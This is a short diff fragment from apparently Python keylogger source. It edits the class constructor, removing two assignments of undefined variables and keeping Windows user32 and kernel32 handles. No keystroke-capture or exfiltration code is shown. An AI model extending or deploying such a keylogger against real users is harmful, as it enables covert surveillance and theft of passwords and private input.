@@ -12,8 +12,6 @@ import win32api
 class keylogger(threading.Thread):
     def __init__(self):  
         threading.Thread.__init__(self)  
-        self.thread_num = num  
-        self.interval = interval  
         self.thread_stop = False  
         self.user32 = windll.user32
         self.kernel32 = windll.kernel32
